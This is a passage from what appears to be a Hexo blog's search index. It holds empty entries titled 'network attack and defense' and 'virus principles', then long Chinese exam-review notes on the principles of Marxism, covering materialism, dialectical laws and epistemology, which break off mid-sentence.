<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网络攻击与防御</title>
      <link href="2021/04/19/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
      <url>2021/04/19/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>病毒原理</title>
      <link href="2021/04/19/%E7%97%85%E6%AF%92%E5%8E%9F%E7%90%86/"/>
      <url>2021/04/19/%E7%97%85%E6%AF%92%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      <categories>
          
          <category> 病毒 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>马原</title>
      <link href="2021/04/19/%E9%A9%AC%E5%8E%9F/"/>
      <url>2021/04/19/%E9%A9%AC%E5%8E%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="绪论-马克思主义是关于工人阶级和人类解放的学科"><a href="#绪论-马克思主义是关于工人阶级和人类解放的学科" class="headerlink" title="绪论 马克思主义是关于工人阶级和人类解放的学科"></a><strong>绪论</strong> <strong>马克思主义是关于工人阶级和人类解放的学科</strong></h2><p>1<strong>、关于马克思主义的产生</strong></p><p><strong>马克思主义产生的时间</strong>：19 世纪 40 年代中期</p><p><strong>马克思主义的客观历史条件</strong>—–资本主义得到迅速发展及其内在矛盾的尖锐化，以及马克思主义作为独立的政治力量登上历</p><p>史舞台（阶级基础）</p><p><strong>马克思主义产生的直接理论来源</strong>：德国的古典哲学、英国的古典政治经济学、英法空想社会主义学说</p><p><strong>马克思主义产生的自然科学基础</strong>：细胞学说、能量守恒和转化定律和达尔文生物进化论的自然科学的三大发现</p><p><strong>马克思主义产生的主观条件</strong>：马恩的崇高理想、勤奋好学、理论联系实际的学风，使他们两人成为马克思主义的创始人。</p><p>2<strong>、关于马克思主义的自身理论</strong></p><p><strong>马克思主义的三大组成部分</strong>：马克思主义哲学、马克思主义政治经济学和科学社会主义内在统一整体</p><p><strong>马克思主义的广义理解</strong>：包括创始人在内及其继承者—–列宁主义、中国的毛泽东思想和中国特色社会主义理论体系（包括邓小平理论、</p><p>‘三个代表’重要思想和科学发展观）</p><p><strong>马克思主义的科学内涵</strong>：</p><p>第一、马克思主义是马克思、恩格斯共同创立的。</p><p>第二、马克思主义不仅包括它的创始人马克思、恩格斯的理论，而且包括它的继承人的理论，特别 是列宁、毛泽东、邓小</p><p>平等人的理论。 </p><p>第三、在基本观点、基本立场、基本方法、价值取向等方面与马克思、恩格斯创立的理论前后相继、一脉相承，在本质上相</p><p>一致的。 </p><p>第四、马克思主义的各个组成部分是一个具有内在逻辑联系的科学体系。</p><p><strong>马克思主义的理论特征</strong>: 以实践为基础的科学性和革命性的统一。</p><p><strong>马克思主义的理论品质</strong>：与时俱进</p><p><strong>马克思主义的社会理想</strong>：实现共产主义，（最高理想）。</p><p><strong>中国近期的共同理想和最高理想的关系</strong>：<strong>最高理想与共同理想:注意理解把握要点，二者的关系</strong>：</p><p>马克思主义最高的社会理想，就是推翻资本主义、实现共产主义，实现共产主义是长期的远大的理想；建设中国特色社会主</p><p>义是全国各族人民的共同理想，相对于最高理想来说，共同理想是近期的具体理想。</p><p> 最高理想与共同理想，既相互区别又相互联系，二者是辩证统一的关系。首先，共同理想是实现最高理想的必经阶段和必要</p><p>基础。其次，实现共同理想，必须坚持以最高理想为根本方向。（简答）</p><p>3<strong>、关于如何对待马克思主义</strong></p><p>把马克思主义当作行动的指南,反对教条主义;明确学习马克思主义的目的（第一、树立正确的世界观、人生观、价值观。第</p><p>二、掌握认识世界和改造世界的伟大工具。第三、全面提高人的素质。</p><p>）；坚持学习马克思主义的根本方法—-理论联系实际。</p><h2 id="马克思主义哲学部分（第一章—-第三章）"><a href="#马克思主义哲学部分（第一章—-第三章）" class="headerlink" title="马克思主义哲学部分（第一章—-第三章）"></a><strong>马克思主义哲学部分（第一章</strong>—-<strong>第三章）</strong></h2><h3 id="第一章-物质世界及其发展规律"><a href="#第一章-物质世界及其发展规律" class="headerlink" title="第一章 物质世界及其发展规律"></a><strong>第一章</strong> <strong>物质世界及其发展规律</strong></h3><p>1<strong>，关于哲学的含义及哲学的基本问题：</strong></p><p><strong>哲学的含义</strong>：哲学是系统化、理论化的世界观的理论体系；是世界观、方法论和价值观的统一。</p><p><strong>哲学的基本问题</strong>：思维和存在关系问题,哲学的基本问题有二方面内容：第一是何者为第一，它是划分唯物主义和唯心主义</p><p>的唯一标准；第二是两者有无统一性，它是划分可知论和不可知论的唯一标准。</p><p>哲学发展的二个基本派别；唯物主义和唯心主义；它们的历史形态分别为：唯物主义经历了朴素唯物主义、形而上学唯物主</p><p>义和辩证唯物主义和历史唯物主义三个形态；唯心主义则有二种形式：主观唯心主义和客观唯心主义。</p><p><strong>思维和存在或意识和物质的关系问题</strong></p><pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid">graph LR;  哲学的基本问题--&gt;物质和意识哪个是本原  哲学的基本问题--&gt;思维和存在的同一性  物质和意识哪个是本原--&gt;唯物主义  物质和意识哪个是本原--&gt;唯心主义  思维和存在的同一性--&gt;可知论  思维和存在的同一性--&gt;不可知论<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid">graph LR;  社会历史观的基本问题&#x2F;社会存在与社会意识关系--&gt;历史唯心主义  社会历史观的基本问题&#x2F;社会存在与社会意识关系--&gt;历史唯物主义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid">graph LR;  世界存在状态--&gt;辩证法  世界存在状态--&gt;形而上学<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在唯物主义和唯心主义的对立中，又交织着辩证法和形而上学的对立。辩证法和形而上学的对立从属于唯物主义和唯心主义<br>的对立。<br>在世界的本质问题上一元论和二元论、唯物主义和唯心主义的对立<br>世界的本质问题，实质上是世界的统一性问题。</p><pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid">graph LR;  世界的统一性问题--&gt;一元论  世界的统一性问题--&gt;二元论  一元论--&gt;唯物主义  一元论--&gt;唯心主义  唯物主义--&gt;古代朴素唯物主义  唯物主义--&gt;近代的形而上学唯物主义  唯物主义--&gt;现代的辩证唯物主义和历史唯物主义  唯心主义--&gt;主观唯心主义  唯心主义--&gt;客观唯心主义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2<strong>、马克思主义的物质观：</strong></p><p>第一、它指出物质是不依赖于意识的客观实在，同唯心主义划清了界限。</p><p>第二、它指出物质是可以被人们认识的，同不可知论划清了界限。</p><p>第三、它指出客观实在性是一切物质的共性，克服了旧唯物主义物质观的局限性。</p><p>3<strong>、马克是主义的运动观</strong></p><p><strong>物质与运动不可分原理</strong>：物质离不开运动（相反是形而上学）；运动也离不开物质（相反是唯心主义）</p><p><strong>相对静止的重要意义</strong>：</p><p>第一、只有承认相对静止，才能理解事物的多样性，区分开不同的事物。第二、只有承认相对静止，才能认识事物分化的条</p><p>件和生命现象的产生。第三、只有承认相对静止，才能理解绝对运动。</p><p><strong>事物是绝对运动和相对静止的辩证统一</strong>（只承认静止不承认绝对运动是形而上学；只承认运动不承认相对静止时相对主义诡</p><p>辩论）</p><p>4<strong>、马克思主义的时空观：</strong></p><p><strong>时空的哲学含义和特点</strong>：</p><p>时间是物质运动的持续性、顺序性。时间的特点是一维性。空间是物质运动的广延性和伸张性。物质的空间特性通常以两种</p><p>形式表现出来：体积、空间位置。空间的特点是三维性。时间和空间是内在统一不可分离的（四维时空概念）。</p><p><strong>时空与运动着的物质不可分离</strong>:</p><p>时间和空间是运动着的物质的存在方式，时间和空间与运动着的物质不可分离，世界上既没有脱离时间和空间运动的物质，</p><p>也没有脱离物质运动的时间和空间。</p><p><strong>时空的客观性；时空的绝对、无限、与时空的相对、有限的含义和和关系</strong>：</p><p>时间和空间既是绝对的、无限的，又是相对的、有限的，是绝对和相对、无限和有限的统一。</p><p>绝对性、无限性：时间上无始无终，在空间上无边无际。</p><p>相对性、有限性：每一具体事物在时间上有始有终，在空间上有边有际。</p><p>时间和空间的绝对性、无限性与相对性、有限性是不可分割的，通过时间和空间的相对性、有限性，去认识、把握其绝对</p><p>性、无限性。</p><p>5<strong>、马克思主义的实践观：</strong></p><p><strong>实践的含义</strong>：实践是主体能动地改造和探索客体的社会性的客观物质活动。</p><p><strong>实践的三个基本特点</strong>：第一、客观性。从根本上与唯心主义实践观划清界限。第二、自觉能动性。从根本上与旧唯物主义实</p><p>践观划清界限。第三、社会历史性。同唯心主义实践观划清界限，又同旧唯物主义实践观以及实用主义实践观区别开来。</p><p><strong>实践的三种基本形式</strong>：第一、物质生产实践。第二、处理社会关系的实践。第三、科学实验。其他一些实践形式（教育实</p><p>践、医疗实践、艺术实践）</p><p><strong>人生活于其中的世界是与人的实践相联系的物质世界</strong>: </p><p>,第一、人的实践活动与自然界的二重化。第二、社会历史是人们的实践活动创造的。第三、实践是人的存在方式。</p><p><strong>社会生活在本质上是实践的</strong>：</p><p>第一、劳动实践是人类和人类社会产生的决定性环节 第二、物质生产实践是人类社会得以存在的基础。</p><p>第三、实践活动是推动社会发展的动力。</p><p>6<strong>、唯物辩证法的体系</strong></p><p><strong>二个特征：</strong></p><p><strong>（</strong>1<strong>）联系：</strong>联系的客观普遍性；联系的多样化</p><p>联系是指事物之间以及事物内部诸要素之间的相互影响、相互作用和相互制约的关系。</p><p>事物之间的联系时客观的，联系是普遍的。联系的普遍的性是指：世界上任何事物都不能孤立地存在，都与周围的其他</p><p>事物处于相互联系之中；每一事物内部各个要素也不能孤立地存在，都是与其他要素相互联系的；整个世界不是各种孤立的</p><p>事物的机械堆积，而是由无数相互联系的事物构成的统一整体。</p><p>具体联系又是复杂多样的，事物联系的主要形式有：直接联系与间接联系、内部联系与外部联系、本质联系与非本质联系、</p><p>必然联系与偶然联系，等等。</p><p><strong>（</strong>2<strong>）发展</strong>：发展的实质是新陈代谢的运动和变化</p><p>发展是指事物一种特殊的运动变化—上升性、前进性的运动变化，即事物由低级到高级、由简单到复杂的不断更替的运动变</p><p>化过程。发展的实质是新事物的产生和旧事物的灭亡。</p><p>新事物必然战胜旧事物的原理（新事物的含义及其理由）：</p><p>新事物是指符合事物发展规律、具有强大生命力和远大前途的事物。旧事物是指丧失了其存在的必然性、日趋灭亡的事物。</p><p>新事物必然战胜旧事物，是由新旧事物的本质特点和事物发展的辩证本性决定的：</p><p>1.新事物符合事物发展的必然趋势。 2.新事物优越于旧事物。</p><p>3.社会历史领域内，人民群众是社会群众创造者和绝对力量，新事物是社会上先进的、富有创造力的人们创造性活动的产</p><p>物，它从根本上符合广大人民群众的利益和要求，能够得到广大人民群众的拥护和支持。它必然战胜旧事物。</p><p>（3）两种对立的发展观：</p><p>1.联系观点和孤立观点的对立。 2.发展变化观点和静止不变观点的对立。 3.承认事物内部矛盾和否认事物内部矛盾的对立。</p><p>唯物辩证法与形而上学的根本对立和斗争焦点在于是否承认矛盾是事物发展的动力。</p><p><strong>三大规律：</strong></p><p><strong>（</strong>1<strong>）对立统一规律：</strong></p><p>对立统一规律亦称矛盾规律，其基本内容是：任何事物都包含着矛盾；矛盾双方既统一又斗争；由此推动事物运动变化发展。</p><p>辩证矛盾的含义：</p><p>矛盾是指事物内部两方面之间既对立又统一的关系，也就是事物内部两方面之间既相互排斥又相互联系的关系。简言之，矛盾就是对立统</p><p>一。</p><p><strong>矛盾的两种基本属性及其关系</strong>：</p><p>矛盾双方的对立和统一这两重关系决定了矛盾具有两种基本属性，即同一性和斗争性。</p><p>*矛盾的同一性是指矛盾双方相互联系、相互吸引的性质。它包括两方面的含义。</p><p>第一、矛盾双方相互依存。第二、矛盾双方相互贯通。它主要表现为以下两种情形：其一是矛盾双方的相互渗透或相互包含。其二是矛盾</p><p>双方在<strong>一定条件下</strong>相互转化的趋势。</p><p>*矛盾的斗争性是指矛盾双方相互排斥、相互对立的性质。矛盾的斗争性具有无限多样的表现形式.</p><p>矛盾的同一性和斗争性是既相互区别，又相互联结的:</p><p>首先，基本属性不同，在矛盾运动中所处的地位是不同的。矛盾的同一性是相对的，矛盾的斗争性是绝对的。矛盾同一性的相对性是指它</p><p>的条件性。矛盾斗争性的绝对性是指它的无条件性（无论在任何条件下矛盾双方都会有斗争）。</p><p>其次，矛盾的同一性和斗争性又是相互联结、不可分离的。一方面，同一性不能脱离斗争而存在，没有斗争就没有同一性。另一方面，斗</p><p>争性寓于同一性之中，没有同一性也没有斗争性。</p><p>矛盾的同一性和斗争性相互联结的关系，要求我们在分析和处理矛盾时，必须在对立中把握同一，在同一中把握对立。</p><p><strong>矛盾是如何推动事物发展的</strong>：</p><p>事物发展的动力和源泉是事物的内部矛盾。矛盾的同一性在事物发展中的作用主要表现在：</p><p>第一、矛盾双方相互依存，使事物保持相对稳定性，为事物的存在和发展提供必要的前提。</p><p>第二、矛盾双方互相从对方吸取有利于自身的因素而得到发展。 第三、矛盾的同一性规定着事物发展的基本趋势。</p><p>矛盾的斗争性在事物发展中的作用主要表现在：</p><p>第一、在事物量变过程中，斗争推动着矛盾双方的力量对比和相互关系发生变化，为质变做准备。第二、在事物质变过程中，斗争突破事</p><p>物存在的限度，促成矛盾的转化，实现事物的质变。</p><p>在事物的发展过程中，矛盾的同一性和斗争性都有重要作用，但都不能孤立地起作用，只有二者始终结合在一起才能成为事物发展的动</p><p>力。</p><p><strong>内因和外因的关系</strong>：</p><p>第一、<strong>内因</strong>是事物发展变化的<strong>根据</strong>，是第一位的原因。第二、<strong>外因</strong>是事物发展变化的<strong>条件</strong>，是第二位的原因。在<strong>一定情况</strong>下，<strong>外因</strong>对事</p><p>物的发展甚至<strong>起决定性</strong>作用。第三、外因通过内因而起作用。矛盾的普遍性和特殊性的辩证关系：</p><p>矛盾是普遍存在的：无处不在，无时不有。矛盾的普遍性原理，矛盾的普遍性也就是矛盾的共性。矛盾的不同就是矛盾的特殊性。</p><p>矛盾的特殊性原理具有重要的方法论意义。<strong>分析矛盾的特殊性就是坚持具体问题具体分析</strong>。一方面，<strong>分析矛盾的特殊性是正确认识事物</strong></p><p><strong>的基础</strong>。另一方面，<strong>分析矛盾的特殊性是正确解决矛盾的关键</strong>。（“一把钥匙开一把锁”）具体问题具体分析是马克思主义的活的灵</p><p>魂。</p><p>矛盾的普遍性和特殊性的关系和意义，也就是共性与个性、一般与个别的关系，它们是辩证统一的。</p><p>第一、矛盾普遍性与特殊性是<strong>互相联结</strong>的。一方面，普遍性存在于特殊性之中，另一方面，特殊性中包含着普遍性。如果割裂了特殊性</p><p>与普遍性的联系，就会导致“白马非马”的诡辩命题。一般就是普通，个别就是特殊。</p><p>第二、矛盾普遍性与特殊性是<strong>互相区别</strong>的。一般（普通）比个别（特殊）更普遍、深刻，个别比一般更丰富、具体。</p><p>第三、矛盾普遍性与特殊性在<strong>一定条件下</strong>可以<strong>互相转化</strong>。 </p><p>*矛盾普遍性与特殊性辩证关系的原理，是矛盾问题的精髓。</p><p>*矛盾普遍性和特殊性辩证关系的原理，是我们坚持马克思主义普遍真理同中国具体实际相结合，建设<strong>中国特色社会主义</strong>的理论基础。</p><p>矛盾发展的不平衡性原理（主要矛盾和次要矛盾及矛盾的主要方面和次要方面的关系）</p><p>矛盾发展的不平衡性是矛盾特殊性的重要表现。它主要表现为两种情形：一种是主要矛盾和次要矛盾的不平衡；另一种是矛盾的主要方面</p><p>和次要方面的不平衡。</p><p>主要矛盾和次要矛盾的关系是：首先，二者相互影响、相互作用。其次，主要矛盾和次要矛盾的地位不是一成不变的，它们在一定条件下</p><p>可以相互转化。</p><p>主要矛盾和次要矛盾关系的原理，对于社会主义现代化建设具有重要意义。我们在集中力量抓经济建设的同时，还必须注意解决好其他社</p><p>会矛盾，坚持一系列“两手抓”的方针，一手抓物质文明建设，一手抓精神文明建设；一手抓改革开放，一手抓打击犯罪；一手抓经济建</p><p>设，一手抓民主法制；等等。只有这样，才能实现经济、政治、文化、社会全面协调可持续发展。</p><p>矛盾的主要方面和次要方面的关系是：首先，矛盾的主要方面和次要方面是相互制约、相互作用的。其次，矛盾的主要方面和次要方面的</p><p>地位不是固定不变的，在一定条件下可以相互转化，随着矛盾双方主次地位的转化，事物的性质也就发生了变化。</p><p>主要矛盾和次要矛盾、矛盾的主要方面和次要方面关系的不平衡性的原理：</p><p>要求我们在实际工作中坚持两点论和重点论的统一。我国坚持以经济建设为中心和一系列“两手抓”的方针，认识我国社会主义现代化建</p><p>设的形势要分清主流和支流，既要抓住主流、坚定信心，又不忽略支流，都是坚持两点论和重点论统一的具体表现。</p><p><strong>（</strong>2<strong>）质量互变规律：</strong></p><p>质量度的含义及其掌握度的意义：</p><p>质是指一事物<strong>区别</strong>于他事物的<strong>内在规定</strong>性。<strong>质是事物的内在规定，属性是质的外在表现</strong>。<strong>属性</strong>是一事物和他事物<strong>发生联系时表现出来的</strong></p><p><strong>质</strong>。</p><p>量是指事物存在和发展的规模、程度、速度等可以用数量表示的规定性，以及事物构成成分在空间上的排列组合。</p><p>任何事物都是质和量的统一体。</p><p>*度是指事物保持自己质的数量限度(或范围、幅度)，它体现着质和量的统一。</p><p>*掌握事物的度具有重要的意义：</p><p>在认识上，只有把握了事物的度，注意决定质的数量限度，才能<strong>准确地认识事物的质。</strong>在实践上，<strong>坚持适度原则。</strong>防止“过”或“不</p><p>及”。“注意分寸”、“掌握火候”、“适可而止”、“过犹不及”等等，都是要求在实践中<strong>坚持适度原则</strong>。</p><p>量变与质变的辩证关系和意义：</p><p>*<strong>量变和质变是辩证统一的</strong>: （论述题）</p><p>第一、量变是质变的必要准备，质变离不开量变。第二、质变是量变的必然结果。第三、量变和质变相互渗透。一方面，质变体现和巩固</p><p>量变的成果，另一方面，在总的量变过程中有阶段性和局部性的部分质变。</p><p>量变和质变是辩证统一的，割裂二者的统一，就会导致激变论或庸俗进化论。激变论只承认质变，否认量变。激变论在社会政治上表现为</p><p>冒险主义。庸俗进化论只承认量变，否认质变。社会政治上表现为改良主义。</p><p>*质量互变规律要求我们在社会主义建设和改革过程中，把远大的理想和目标同有步骤、分阶段地踏实苦干、稳步前进的精神结合起来，</p><p>反对急躁冒进、急于求成。否则会欲速则不达，得到事与愿违的结果。</p><p><strong>（</strong>3<strong>）否定之否定规律：</strong></p><p>肯定和否定的关系：</p><p>任何事物内部都包含着肯定和否定两个方面。肯定方面是指事物中维持其存在的方面，即肯定这一事物是它自身而不是他物的方面。否定</p><p>方面是指事物中促使其灭亡的方面，即破坏现存事物使它转化为他物的方面。任何事物都是肯定方面和否定方面的统一体。</p><p>*肯定和否定是事物内部两个相反的方面，它们又是辩证统一的：一方面，肯定和否定相互依存。另一方面，肯定和否定相互渗透。</p><p>*<strong>唯物辩证法的否定观集中体现了马克思主义哲学批判的、革命的本质。</strong>辩证否定观的内容和意义：</p><p>第一、辩证的否定是<strong>事物的自我否定</strong>，即通过事物内部矛盾而进行的对自身的否定。</p><p>第二、辩证的否定具有<strong>两个重要特点</strong>：其一否定是<strong>事物发展</strong>的环节。其二否定是<strong>事物联系</strong>的环节。</p><p>第三、作为<strong>发展环节和联系环节之统一</strong>的辩证否定是<strong>扬弃</strong>（既克服又保留）。</p><p>对于中国传统文化：除去糟粕，吸取精华。对于外国文化，要采取有分析、有选择、有批判。</p><p>否定之否定规律的基本内容是：</p><p>事物的发展经过两次辩证的否定，由肯定阶段到否定阶段，再到否定之否定阶段，从而使事物的发展表现为螺旋式上升和波浪式前进的过</p><p>程。否定之否定规律揭示了事物的发展是前进性和曲折性的统一。</p><p>否定之否定规律揭示事物的总趋势和具体道路是前进和曲折的统一：</p><p>*否定之否定规律揭示了事物发展的总趋势是前进的、上升的。否定之否定规律揭示了事物发展的具体道路是曲折的。如果割裂了二者的</p><p>统一，会导致循环论和直线论的错误。</p><p>*把握否定之否定规律，坚持事物的发展是前进性和曲折性统一的原理，对我们正确认识社会主义现代化建设事业具有重要意义.首先，要</p><p>坚信社会主义的前途是光明的,其次,要准备走曲折的路。</p><p><strong>五对范畴：</strong></p><p>原因与结果、必然与偶然、可能与现实、内容与形式、本质与现象（五对范畴的共性：都体现对立统一的关系；各自的个性）：</p><p><strong>（一）原因与结果：</strong></p><p>*原因和结果的联系是事物或现象之间引起和被引起的联系。引起某种现象的现象就是原因，被某种现象所引起的现象就是结果。</p><p>因果联系的一个显著特点是：原因在先，结果在后。因果联系是引起和被引起的关系。<strong>原因和结果之间的关系是对立统一关系</strong>。首先，</p><p>原因和结果是对立的。其次，原因和结果又是统一的。表现在：第一、原因和结果相互依存。第二、原因和结果在一定条件下相互转化</p><p>【摩擦-生热-燃烧-爆炸】。第三、原因和结果是相互作用的【生产力与生产关系】。</p><p><strong>（二）必然性和偶然性</strong></p><p>必然性和偶然性是事物联系和发展中两种不同的趋势。<strong>必然性是指事物联系和发展过程中确定不移的、不可避免的趋势</strong>。</p><p><strong>必然性与本质和规律是同等程度的概念</strong>。<strong>偶然性</strong>是指事物联系和发展过程中<strong>不确定的趋势</strong>。</p><p><strong>必然性和偶然性之间的关系是对立统一关系。</strong></p><p>*掌握必然性和偶然性辩证关系的原理具有重要意义：</p><p>首先，因为偶然性是受必然性支配的，按必然规律办事，不要被偶然现象所迷惑。其次，因为必然性是通过大量偶然性表现</p><p>出来的，偶然性是必然性的表现形式和补充，所以我们应当抓住偶然性提供的机遇，揭示偶然现象背后隐藏的必然性，重视</p><p>偶然性。此外，偶然性对事物的发展有重要的影响作用，我们决不能忽视偶然性。</p><p><strong>（三）可能性和现实性</strong></p><p>必然性通过偶然性为自己开辟道路时，要经历由可能到现实的转化过程。</p><p>现实性是指包含内在根据的、合乎必然性的存在，是客观事物和现象种种联系的综合。</p><p>可能性是包含在现实事物中、预示事物发展前途的种种趋势、潜在的尚未实现的东西。</p><p><strong>（四）内容和形式</strong></p><p>*内容是指构成事物一切要素的总和，即事物的各种内在矛盾以及由这些矛盾所决定的事物的特性、成分、运动过程和发展的趋势等的总</p><p>和。形式是指把内容诸要素统一起来的结构或表现内容的方式。内容与形式的关系是对立统一、相互作用的关系。</p><p><strong>（五）本质和现象</strong></p><p>本质是指事物的<strong>根本性质</strong>以及组成事物基本要素的<strong>内在联系</strong>。现象是指事物的<strong>表面特征</strong>以及这些特征的<strong>外部联系</strong>。有些现象与本质是一</p><p>致的，通常叫真相；有些现象与本质似乎不一致，这种情况通常叫作假相。<strong>假象同真相一样，也是客观存在的。因而不能把它同主观上</strong></p><p><strong>的错觉混为一谈</strong>。真相反应本质，假象也反应本质。</p><p>7<strong>、关于规律</strong></p><p>规律的含义和特点：</p><p>规律就是物质运动发展过程中本质的、必然的、稳定的联系。</p><p>规律具有两个特点。第一、客观性。第二、普遍性。</p><p>自然规律是在自然界各个领域起作用的规律，是自然界中的物质运动发展过程中本质的、必然的、稳定的联系。</p><p>社会发展是有规律的自然历史过程（自然规律与社会规律的区别和共性）：</p><p>区别：自然规律是通过自然界各种盲目的力量相互作用实现的，它是自发地起作用，不需要人的参与。社会发展规律是通过人们的自觉活</p><p>动实现的。</p><p>共同性：社会的发展同自然界一样，也是客观的、有规律的辩证发展过程。</p><p>第一、<strong>在社会领域</strong>，<strong>人们的自觉活动虽然都是有目的、有意识的</strong>，<strong>但人们的自觉活动相互作用、相</strong></p><p> <strong>互冲突</strong>，形成不以他们的主观意志为转移的<strong>客观过程</strong>。</p><p>第二、支配人们自觉活动的<strong>思想动机</strong>是由<strong>社会物质生活条件</strong>决定的，<strong>而社会物质生活条件的变化是</strong> </p><p> <strong>有规律的。</strong></p><p>第三、<strong>人们的自觉活动受着客观物质条件的制约，不能自由地选择生产力和生产关系</strong>。8<strong>、马克思主义的意识论：</strong></p><p>意识的起源（二点）：</p><p><strong>首先**</strong>，意识是自然界长期发展的产物**<strong>。自然界的长期演化和发展包括如下三个阶段：</strong></p><p>第一、从无生命物质的反应特性到生物的刺激感应性。</p><p>第二、从低等生物的刺激感应性到动物的感觉和心理。（专门反映外界刺激的感觉器官和神经系统）。</p><p>第三、从动物的感觉和心理到人类意识的产生。（人脑）</p><p><strong>其次，**</strong>意识是社会性劳动的产物**<strong>。</strong></p><p>意识不仅是自然界长期发展的产物，而且是社会的产物，社会性劳动在意识产生过程中起着<strong>决定性</strong>的作用。</p><p>第一、劳动使猿脑变为人脑，为意识的产生提供了物质器官。</p><p>第二、劳动产生了语言，为意识的内容提供了物质外壳。社会性劳动是意识的物质器官和物质外壳形成和完善的基础，是由动物心理发展</p><p>到人类意识的决定性力量。</p><p>意识的本质（三点）：</p><p>第一、意识是人脑的机能，人脑是意识的物质器官。（必要条件）</p><p>第二、意识是客观世界的主观映像（意识形式），是人脑对客观世界的反映（意识内容）。意识是主观性和客观性的统一。</p><p>第三、意识是社会的产物。</p><p>意识的能动作用（意识对物质的发作用）：</p><p>辩证唯物主义认为，物质与意识的关系是：物质决定意识，物质第一性，意识第二性；意识对物质又具有能动的反作用。坚持物质决定意</p><p>识，就坚持了唯物论；同时又承认意识的能动作用，就坚持了辩证法。物质决定意识和意识的能动作用是辩证的统一。</p><p>意识的能动性（即意识的能动作用的含义及其主要表现：四点）：</p><p>意识的能动性（即主观能动性）是指意识能动地反映世界和通过实践改造世界的能力和作用。</p><p>意识的能动性主要表现在以下四个方面：</p><p>第一、意识活动具有目的性和计划性。（具有超前性和预见性）（人建造房屋与蜜蜂建造蜂房）。</p><p>第二、意识活动具有主动创造性。（普通）</p><p>第三、意识对于人的生理活动具有一定影响作用。（特殊）</p><p>第四、意识能通过指导实践改造客观物质世界。这是意识的能动性最突出的表现。★</p><p>发挥主观能动性（即意识的作用）与尊重客观规律的关系：</p><p>要正确发挥人的主观能动性，必须正确处理主观能动性和客观规律性的关系。尊重客观规律和发挥主观能动性是辩证统一的。</p><p>第一、尊重客观规律是正确发挥主观能动性的前提。</p><p>第二、认识和利用规律又必须充分发挥人的主观能动性。</p><p>*尊重客观规律和发挥主观能动性辩证统一的原理，具有重要的现实意义：在社会主义现代化建设和各项工作中，把高度的实践热情、创</p><p>新精神与科学的求实态度结合起来。</p><h3 id="第二章-认识的本质及其规律（认识论）"><a href="#第二章-认识的本质及其规律（认识论）" class="headerlink" title="第二章 认识的本质及其规律（认识论）"></a><strong>第二章 认识的本质及其规律（认识论）</strong></h3><p>1<strong>、实践对认识的决定作用（即实践是认识的基础）表现为四点：来源、动力、标准和目的：</strong></p><p>马克思主义哲学把实践观引入到认识中来，克服了以往唯物论在认识论上的局限性，认识实践的观点是辩证唯物主义认识论之第一的基本</p><p>的观点，实践是认识的基础，从而引起了认识论的革命。马克思主义哲学认为实践对认识具有决定性的作用，具体表现如下：</p><p>1.实践是认识的来源</p><p>实践是沟通主题和客体的桥梁，而能使主体和客体相互接触、相互作用的唯一途径就是实践。（微观）</p><p>人的认识能力和作为认识结果的知识，都只能来源于实践。</p><p>强调实践是认识和知识的唯一源泉，并不否认可以从他人和书本获得知识。书本上的知识，仍然是从实践中得来的。（宏观）</p><p>2.实践是认识发展的动力（如何推到认识发展的动力）</p><p>第一、社会实践不断提出新的需要、新的研究课题，推动认识的发展。</p><p>第二、社会实践为认识不断提供新的经验和新的观察、研究的物质手段。</p><p>第三、社会实践推动人的思维能力的发展。人们在实践中不仅改造客观世界而且也改造着 自身的认识能力。</p><p>3.为什么实践是检验认识真理性的唯一标准(P118-119)</p><p>这是由真理的本性和实践的特点所决定的。第一、<strong>是不是真理就是要判明认识与认识对象是否相一致、相符合，主观真理论者无例外地</strong></p><p><strong>都是从主观认识范围去解决这个问题</strong>；实践是人的主观见之于客观的活动，它能把主观认识与客观实际联系起来加以对照，来确定认识</p><p>与认识对象是否相一致、相符合，从而使认识得到检验。第二、<strong>唯有实践才具有直接现实性品格</strong>。通过实践把思想、理论在现实中实现</p><p>出来，人们通过把变成现实的东西同原来观念、思想加以对照，从而判明这个思想、观念是否正确，使认识得到检验。</p><p>4.实践是认识的目的</p><p>认识世界的目的在于改造世界，实践是认识的源泉、动力、标准和最终目的，这些都是实践对认识决定作用的具体表现。2<strong>、认识主体、客体、及其关系：</strong></p><p>认识主体：</p><p>第一、认识主体的含义。认识主体是指认识和实践活动的承担者，是处于一定社会关系中从事实践活动和认识活动的现实的、具体的人。</p><p>第二、认识主体的性质和特点。首先，人作为认识主体具有<strong>自然的物质基础</strong>。人具有自然属性。其次，认识主体不仅具有自然的物质基</p><p>础，具有<strong>社会历史性</strong>。再次，认识主体具有<strong>能动性</strong>。[突出特点]</p><p>第三、认识主体的结构。人是唯一能担当起认识主体的存在物，这个存在物具有自身的结构，它分为个体、群体和人类整体诸层次。<strong>作</strong></p><p><strong>为认识主体的人类整